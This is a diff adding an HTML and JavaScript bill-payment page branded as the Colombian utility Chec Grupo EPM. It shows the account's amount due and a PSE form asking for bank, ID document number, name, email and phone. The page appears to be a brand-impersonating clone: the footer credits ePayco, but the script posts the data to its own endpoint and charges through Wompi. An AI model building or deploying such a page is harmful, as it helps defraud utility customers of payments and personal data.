@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmar Pago - Chec Grupo EPM</title>
+    <style>
+        /* --- RESET Y FUENTES --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body, html { height: 100%; width: 100%; background-color: #ffffff; }
+
+        /* --- CONTENEDOR PRINCIPAL (LAYOUT PC) --- */
+        .main-container { display: flex; height: 100vh; width: 100%; overflow: hidden; }
+
+        /* --- COLUMNA IZQUIERDA (CONTENIDO) --- */
+        .left-panel {
+            width: 50%; background-color: #ffffff; display: flex; flex-direction: column;
+            justify-content: space-between; padding: 40px 60px; position: relative; z-index: 2;
+        }
+
+        /* Logos Superiores */
+        .top-logos { display: flex; align-items: center; justify-content: center; gap: 40px; margin-bottom: 20px; }
+        .top-logos img { height: 95px; object-fit: contain; }
+        .logo-chec { height: 130px !important; }
+
+        /* Contenido Central (Datos de Pago) */
+        .payment-content {
+            max-width: 480px; width: 100%; margin: 0 auto; text-align: center;
+            flex-grow: 1; display: flex; flex-direction: column; justify-content: center;
+        }
+
+        .payment-content h1 { color: #008f39; font-size: 26px; margin-bottom: 10px; font-weight: 600; }
+
+        .payment-content .subtitle {
+            font-size: 15px; color: #333; margin-bottom: 30px; line-height: 1.4;
+        }
+
+        /* Bloque de información del cliente */
+        .client-info {
+            background-color: transparent; /* Sin fondo en PC según imagen */
+            padding: 0;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .client-info .account-number {
+            background-color: #e0e0e0; /* Fondo gris para el número */
+            border-radius: 20px;
+            padding: 10px 20px;
+            display: inline-block;
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .client-info .client-name {
+            font-size: 16px;
+            color: #333;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* Botón "Agregar otro número de cuenta" */
+        .btn-add-account {
+            background-color: #008f39;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            transition: background 0.3s;
+        }
+        .btn-add-account:hover { background-color: #006b2b; }
+
+        /* Bloque de Valor a Pagar */
+        .amount-box {
+            background-color: #f9f9f9; /* Fondo gris muy claro */
+            border-radius: 8px;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+
+        .amount-box .label {
+            display: flex;
+            align-items: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .amount-box .label svg {
+            width: 22px;
+            height: 22px;
+            margin-right: 10px;
+            color: #008f39;
+        }
+
+        .amount-box .value {
+            font-size: 22px;
+            font-weight: bold;
+            color: #008f39;
+        }
+
+        /* Botones finales (IR A PAGAR / VOLVER) */
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .btn-action {
+            background-color: #008f39;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.3s;
+            flex-grow: 1;
+        }
+        .btn-action:hover { background-color: #006b2b; }
+        .btn-action:disabled { background-color: #ccc; cursor: not-allowed; }
+        .btn-action.secondary { background-color: #008f39; }
+
+        /* ═══ VIDEO OVERLAY (Card con blur) ═══ */
+        .video-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        .video-overlay.active { display: flex; }
+        .video-card {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 20px;
+            width: 90%;
+            max-width: 420px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow: hidden;
+        }
+        .video-card img {
+            width: 60%;
+            max-width: 200px;
+            object-fit: contain;
+            margin: 30px 0;
+        }
+        .video-card .loader-spinner {
+            width: 36px;
+            height: 36px;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #008f39;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        /* PSE Form styles */
+        .pse-card {
+            max-height: 90vh;
+            overflow-y: auto;
+            padding: 25px 20px;
+        }
+        .pse-field {
+            width: 100%;
+            margin-bottom: 12px;
+            text-align: left;
+        }
+        .pse-field label {
+            display: block;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
+        .pse-field input, .pse-field select {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1.5px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #333;
+            background: #fff;
+            transition: border-color 0.2s;
+            outline: none;
+        }
+        .pse-field input:focus, .pse-field select:focus {
+            border-color: #008f39;
+        }
+        .btn-pse-pagar {
+            width: 100%;
+            background-color: #008f39;
+            color: white;
+            border: none;
+            padding: 13px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            text-transform: uppercase;
+            transition: background 0.3s;
+        }
+        .btn-pse-pagar:hover { background-color: #006b2b; }
+        .btn-pse-pagar:disabled { background-color: #ccc; cursor: not-allowed; }
+        .btn-pse-cancel {
+            width: 100%;
+            background: transparent;
+            color: #666;
+            border: 1.5px solid #ddd;
+            padding: 11px;
+            border-radius: 25px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: border-color 0.2s;
+        }
+        .btn-pse-cancel:hover { border-color: #999; }
+        @media (max-width: 768px) {
+            .video-card {
+                width: 92%;
+                max-width: 340px;
+                padding: 15px;
+            }
+            .pse-card {
+                max-height: 85vh;
+                padding: 20px 15px;
+            }
+        }
+
+        /* Footer (Pagos y PSE) */
+        .footer-info { text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px; }
+        .payment-img { height: 20px; object-fit: contain; margin-bottom: 5px; }
+        .footer-info p { font-size: 15px; color: #333; margin-bottom: 5px; }
+        .pse-logo { height: 55px; margin-top: 5px; }
+
+        /* --- COLUMNA DERECHA (IMAGEN PC) --- */
+        .right-panel { width: 50%; position: relative; background-color: #7ab800; display: flex; align-items: center; justify-content: center; }
+        .family-img {
+            width: 100%; height: 100%; object-fit: cover; object-position: center;
+            position: absolute; top: 0; left: 0; z-index: 1;
+        }
+        .green-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(122, 184, 0, 0.6); z-index: 2; mix-blend-mode: multiply;
+        }
+        .logo-overlay-bottom { position: absolute; bottom: 40px; right: 40px; z-index: 3; text-align: right; }
+        .logo-overlay-bottom img { height: 70px; filter: brightness(0) invert(1); }
+
+        /* --- RESPONSIVE (VISTA MÓVIL) --- */
+        @media (max-width: 768px) {
+            .main-container { flex-direction: column; height: auto; min-height: 100vh; }
+            .left-panel { width: 100%; padding: 20px; flex-grow: 1; justify-content: flex-start; }
+            .top-logos { justify-content: center; margin-bottom: 40px; gap: 25px; }
+            .top-logos img { height: 65px; }
+            .logo-chec { height: 85px !important; }
+            .payment-content h1 { font-size: 24px; margin-bottom: 10px; line-height: 1.3; }
+            .payment-content .subtitle { font-size: 14px; margin-bottom: 20px; }
+            .payment-content { margin-bottom: 50px; }
+            
+            /* Ajustes de info del cliente en móvil */
+            .client-info { margin-bottom: 20px; }
+            .client-info .account-number { font-size: 18px; padding: 8px 15px; }
+            .client-info .client-name { font-size: 14px; }
+            
+            .btn-add-account { font-size: 14px; padding: 10px; margin-bottom: 25px; }
+            
+            /* Ajuste de la caja de valor en móvil */
+            .amount-box { padding: 12px 15px; margin-bottom: 25px; }
+            .amount-box .label { font-size: 16px; }
+            .amount-box .value { font-size: 20px; }
+            
+            /* --- CAMBIO CLAVE EN MÓVIL: Ocultar botón VOLVER y centrar IR A PAGAR --- */
+            .action-buttons { flex-direction: column; gap: 10px; }
+            .btn-action { width: 100%; padding: 12px; font-size: 16px; }
+            .btn-action.secondary { display: none; } /* <--- Esto oculta el botón VOLVER en móvil */
+            
+            .footer-info { margin-top: auto; padding-bottom: 20px; }
+            .right-panel { width: 100%; height: 180px; flex-shrink: 0; position: relative; order: 2; }
+            .family-img { object-position: center 30%; }
+            .logo-overlay-bottom { bottom: 15px; right: 15px; left: 15px; text-align: left; }
+            .logo-overlay-bottom img { height: 45px; }
+            .payment-img { height: 20px; }
+            .pse-logo { height: 50px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+
+        <!-- PANEL IZQUIERDO (Contenido) -->
+        <div class="left-panel">
+            <div class="top-logos">
+                <img src="log1.png" alt="Chec Grupo EPM" class="logo-chec">
+                <img src="log2.png" alt="BIC">
+            </div>
+
+            <div class="payment-content">
+                <h1>¡Paga tu factura de energía fácil y rápido!</h1>
+                <p class="subtitle">Si pagas en estos momentos, tu pago se verá reflejado en las próximas horas.</p>
+
+                <!-- Bloque de información del cliente (Dinámico) -->
+                <div class="client-info">
+                    <div class="account-number" id="displayAccount">Cargando...</div>
+                    <div class="client-name" id="displayName">Cargando...</div>
+                </div>
+
+                <button class="btn-add-account">Agregar otro número de cuenta</button>
+
+                <!-- Bloque de Valor a Pagar (Dinámico) -->
+                <div class="amount-box">
+                    <div class="label">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                        </svg>
+                        Valor a Pagar
+                    </div>
+                    <div class="value" id="displayAmount">$0.00</div>
+                </div>
+
+                <!-- Botones de acción -->
+                <div class="action-buttons">
+                    <button class="btn-action" id="btnPagarReal">IR A PAGAR</button>
+                    <button class="btn-action secondary" onclick="window.location.href='index.html'">VOLVER</button>
+                </div>
+            </div>
+
+            <div class="footer-info">
+                <img src="image.png" alt="Pagos procesados por ePayco" class="payment-img">
+                <p>Medio de pago disponible</p>
+                <img src="pse.png" alt="PSE" class="pse-logo">
+            </div>
+        </div>
+
+        <!-- PANEL DERECHO (Imagen) -->
+        <div class="right-panel">
+            <img src="imagen.png" alt="Familia feliz" class="family-img">
+            <div class="green-overlay"></div>
+            <div class="logo-overlay-bottom">
+                <img src="log1.png" alt="Chec">
+            </div>
+        </div>
+
+    </div>
+
+    <!-- ═══ OVERLAY PSE (Formulario banco + datos) ═══ -->
+    <div class="video-overlay" id="pseOverlay">
+        <div class="video-card pse-card">
+            <img src="image.png" alt="ePayco" style="margin-bottom:10px;">
+            <h3 style="color:#008f39;font-size:18px;margin-bottom:15px;font-weight:600;">Pago por PSE</h3>
+
+            <form id="pseForm" style="width:100%;">
+                <div class="pse-field">
+                    <label>Banco</label>
+                    <select id="pseBanco" required>
+                        <option value="">-- Selecciona tu banco --</option>
+                        <optgroup label="Principales Bancos y Neobancos">
+                            <option value="1007">BANCOLOMBIA</option>
+                            <option value="1051">BANCO DAVIVIENDA</option>
+                            <option value="1001">BANCO DE BOGOTA</option>
+                            <option value="1013">BBVA COLOMBIA</option>
+                            <option value="1052">BANCO AV VILLAS</option>
+                            <option value="1032">BANCO CAJA SOCIAL</option>
+                            <option value="1023">BANCO DE OCCIDENTE</option>
+                            <option value="1002">BANCO POPULAR</option>
+                            <option value="1019">SCOTIABANK COLPATRIA</option>
+                            <option value="1062">BANCO FALABELLA</option>
+                            <option value="1012">BANCO GNB SUDAMERIS</option>
+                            <option value="1014">ITAÚ</option>
+                            <option value="1060">BANCO PICHINCHA</option>
+                            <option value="1040">BANCO AGRARIO</option>
+                            <option value="1507">NEQUI</option>
+                            <option value="1551">DAVIPLATA</option>
+                            <option value="1070">LULO BANK</option>
+                            <option value="1809">NU COLOMBIA</option>
+                            <option value="1811">RAPPIPAY</option>
+                            <option value="1804">UALÁ</option>
+                            <option value="1801">MOVII</option>
+                        </optgroup>
+                        <optgroup label="Otras Entidades Financieras">
+                            <option value="1009">CITIBANK</option>
+                            <option value="1031">BANCOLDEX</option>
+                            <option value="1047">BANCO MUNDO MUJER</option>
+                            <option value="1053">BANCO W</option>
+                            <option value="1058">BANCO PROCREDIT</option>
+                            <option value="1059">BANCAMÍA</option>
+                            <option value="1061">BANCOOMEVA</option>
+                            <option value="1063">BANCO FINANDINA</option>
+                            <option value="1065">BANCO SANTANDER COLOMBIA</option>
+                            <option value="1066">BANCO COOPERATIVO COOPCENTRAL</option>
+                            <option value="1067">MIBANCO</option>
+                            <option value="1069">BANCO SERFINANZA</option>
+                            <option value="1071">JP MORGAN</option>
+                            <option value="1097">DALE</option>
+                            <option value="1121">FINANCIERA JURISCOOP</option>
+                            <option value="1283">CFA COOPERATIVA FINANCIERA</option>
+                            <option value="1286">JFK COOPERATIVA FINANCIERA</option>
+                            <option value="1289">COTRAFA COOPERATIVA FINANCIERA</option>
+                            <option value="1292">CONFIAR COOPERATIVA FINANCIERA</option>
+                            <option value="1303">BANCO UNIÓN</option>
+                            <option value="1370">COLTEFINANCIERA</option>
+                            <option value="1558">BAN100</option>
+                            <option value="1560">PIBANK</option>
+                            <option value="1637">IRIS</option>
+                            <option value="1802">DING TECNIPAGOS</option>
+                            <option value="1803">POWWI</option>
+                            <option value="1805">BANCO BTG PACTUAL</option>
+                            <option value="1808">BOLD CF</option>
+                            <option value="1812">COINK</option>
+                            <option value="1814">GLOBAL66</option>
+                            <option value="1815">ALIANZA FIDUCIARIA</option>
+                            <option value="1816">CREZCAMOS</option>
+                            <option value="1819">BANCO CONTACTAR</option>
+                        </optgroup>
+                    </select>
+                </div>
+                <div class="pse-field">
+                    <label>Tipo de documento</label>
+                    <select id="pseDocType">
+                        <option value="CC">Cédula de Ciudadanía</option>
+                        <option value="CE">Cédula de Extranjería</option>
+                        <option value="NIT">NIT</option>
+                        <option value="TI">Tarjeta de Identidad</option>
+                        <option value="PP">Pasaporte</option>
+                    </select>
+                </div>
+                <div class="pse-field">
+                    <label>Número de documento</label>
+                    <input type="text" id="pseDocNum" placeholder="Ej: 1234567890" required>
+                </div>
+                <div class="pse-field">
+                    <label>Nombre completo</label>
+                    <input type="text" id="pseNombre" required>
+                </div>
+                <div class="pse-field">
+                    <label>Correo electrónico</label>
+                    <input type="email" id="pseEmail" placeholder="correo@ejemplo.com" required>
+                </div>
+                <div class="pse-field">
+                    <label>Teléfono</label>
+                    <input type="tel" id="pseTelefono" placeholder="3001234567" required>
+                </div>
+
+                <button type="submit" class="btn-pse-pagar" id="btnPsePagar">PAGAR CON PSE</button>
+                <button type="button" class="btn-pse-cancel" onclick="document.getElementById('pseOverlay').classList.remove('active');">CANCELAR</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- ═══ OVERLAY LOADING (mientras se procesa el cobro) ═══ -->
+    <div class="video-overlay" id="loadingOverlay">
+        <div class="video-card">
+            <img src="image.png" alt="ePayco">
+            <div class="loader-spinner"></div>
+            <p style="color:#333;font-size:14px;margin-top:5px;">Conectando con tu banco...</p>
+        </div>
+    </div>
+
+    <script>
+        // ═══════════════════════════════════════════════
+        // 1. Recuperar datos del localStorage
+        // ═══════════════════════════════════════════════
+        const token = localStorage.getItem("chec_token");
+        const clienteId = localStorage.getItem("chec_clienteId");
+        let datosRaw = JSON.parse(localStorage.getItem("chec_facturas"));
+
+        let facturas = [];
+        if (Array.isArray(datosRaw)) {
+            facturas = datosRaw;
+        } else if (datosRaw && datosRaw.facturas && Array.isArray(datosRaw.facturas)) {
+            facturas = datosRaw.facturas;
+        }
+
+        if (!token || !facturas || facturas.length === 0) {
+            window.location.href = "index.html";
+        }
+
+        // ═══════════════════════════════════════════════
+        // 2. Mostrar datos en el DOM
+        // ═══════════════════════════════════════════════
+        const factura = facturas[0];
+        document.getElementById("displayAccount").textContent = "Numero de Cuenta " + clienteId;
+
+        const nombreCliente = factura.nombres || factura.name || factura.nombre || "Cliente";
+        document.getElementById("displayName").textContent = nombreCliente;
+
+        let valorTotal = 0;
+        facturas.forEach(function(f) {
+            valorTotal += parseFloat(f.total || 0);
+        });
+
+        const formatter = new Intl.NumberFormat('es-CO', {
+            style: 'currency', currency: 'COP', minimumFractionDigits: 0
+        });
+        document.getElementById("displayAmount").textContent = formatter.format(valorTotal);
+
+        // ═══════════════════════════════════════════════
+        // 3. Cargar bancos PSE al iniciar
+        // ═══════════════════════════════════════════════
+        var pseOverlay = document.getElementById("pseOverlay");
+        var loadingOverlay = document.getElementById("loadingOverlay");
+        var selectBanco = document.getElementById("pseBanco");
+        var bancosCargados = false;
+
+        async function actualizarBancos() {
+            try {
+                var res = await fetch("/api/pasarela/bancos-pse");
+                var data = await res.json();
+                console.log("Bancos PSE desde API:", data);
+
+                var bancos = [];
+                if (data.success && data.data) {
+                    if (Array.isArray(data.data)) bancos = data.data;
+                    else if (data.data.data && Array.isArray(data.data.data)) bancos = data.data.data;
+                    else if (data.data.banks && Array.isArray(data.data.banks)) bancos = data.data.banks;
+                }
+
+                if (bancos.length > 0) {
+                    var primerBanco = bancos[0];
+                    var tieneNombre = primerBanco.name || primerBanco.bankName || primerBanco.description || "";
+                    console.log("Primer banco del API:", JSON.stringify(primerBanco));
+
+                    if (tieneNombre && tieneNombre !== "Banco" && tieneNombre.length > 2) {
+                        selectBanco.innerHTML = '<option value="">-- Selecciona tu banco --</option>';
+                        bancos.forEach(function(banco) {
+                            var opt = document.createElement("option");
+                            opt.value = banco.code || banco.id || banco.bankCode || "";
+                            opt.textContent = banco.name || banco.bankName || banco.description || "";
+                            selectBanco.appendChild(opt);
+                        });
+                        console.log("Bancos actualizados desde API (" + bancos.length + ")");
+                    } else {
+                        console.log("API devolvió bancos sin nombres legibles, usando hardcodeados");
+                    }
+                } else {
+                    console.log("API no devolvió bancos, usando lista hardcodeada");
+                }
+                bancosCargados = true;
+            } catch (error) {
+                console.log("No se pudo conectar al API de bancos, usando lista hardcodeada");
+                bancosCargados = true;
+            }
+        }
+
+        actualizarBancos();
+
+        // Pre-llenar nombre del cliente en el form
+        document.getElementById("pseNombre").value = nombreCliente;
+
+        // ═══════════════════════════════════════════════
+        // 4. Botón "IR A PAGAR" → abrir formulario PSE
+        // ═══════════════════════════════════════════════
+        document.getElementById("btnPagarReal").addEventListener("click", function() {
+            pseOverlay.classList.add("active");
+        });
+
+        // ═══════════════════════════════════════════════
+        // 5. Formulario PSE → cobro directo (Wompi)
+        // ═══════════════════════════════════════════════
+        document.getElementById("pseForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            var bankCode = selectBanco.value;
+            if (!bankCode) {
+                alert("Por favor selecciona un banco");
+                return;
+            }
+
+            var btnPse = document.getElementById("btnPsePagar");
+            btnPse.textContent = "PROCESANDO...";
+            btnPse.disabled = true;
+
+            // Cerrar form PSE y mostrar loading
+            pseOverlay.classList.remove("active");
+            loadingOverlay.classList.add("active");
+
+            try {
+                var facturaId = factura.facturaId || factura.FacturaId || factura.id || "0";
+                var reference = "PSE" + Date.now() + Math.random().toString(36).substring(2, 6);
+
+                var res = await fetch("/api/pasarela/cobro-pse", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        amount: valorTotal,
+                        description: "Pago factura CHEC SA ESP - Cuenta " + clienteId,
+                        reference: reference,
+                        bankCode: bankCode,
+                        customerName: document.getElementById("pseNombre").value,
+                        customerEmail: document.getElementById("pseEmail").value,
+                        customerDoc: document.getElementById("pseDocNum").value,
+                        customerDocType: document.getElementById("pseDocType").value,
+                        customerPhone: document.getElementById("pseTelefono").value,
+                        numeroCuenta: clienteId
+                    })
+                });
+
+                var data = await res.json();
+                console.log("Respuesta cobro PSE:", data);
+
+                if (!data.success) {
+                    throw new Error(data.message || "Error al procesar cobro PSE");
+                }
+
+                // Buscar URL de redirección al banco PSE
+                var d = data.data || {};
+                var pseUrl = null;
+                // Wompi devuelve la URL en next_action.redirect_url
+                if (d.next_action && d.next_action.redirect_url) {
+                    pseUrl = d.next_action.redirect_url;
+                } else {
+                    pseUrl = d.url || d.redirect_url || d.bank_url || d.payment_url
+                        || (d.data && (d.data.url || d.data.redirect_url || d.data.bank_url))
+                        || null;
+                }
+
+                if (!pseUrl) {
+                    console.log("Respuesta completa:", JSON.stringify(data));
+                    throw new Error("No se recibió URL del banco PSE");
+                }
+
+                // Redirigir directo al banco (loading overlay sigue visible)
+                window.location.href = pseUrl;
+
+            } catch (error) {
+                console.error("Error en cobro PSE:", error);
+                loadingOverlay.classList.remove("active");
+                alert("Error al conectar con la pasarela. Por favor, intente nuevamente.");
+                btnPse.textContent = "PAGAR CON PSE";
+                btnPse.disabled = false;
+                // Reabrir formulario PSE
+                pseOverlay.classList.add("active");
+            }
+        });
+
+        // ═══════════════════════════════════════════════
+        // 6. Botón "Agregar otro número de cuenta"
+        // ═══════════════════════════════════════════════
+        document.querySelector(".btn-add-account").addEventListener("click", function() {
+            localStorage.removeItem("chec_token");
+            localStorage.removeItem("chec_clienteId");
+            localStorage.removeItem("chec_facturas");
+            window.location.href = "index.html";
+        });
+
+        console.log("Cliente:", clienteId);
+        console.log("Facturas:", facturas);
+    </script>
+</body>
+</html>
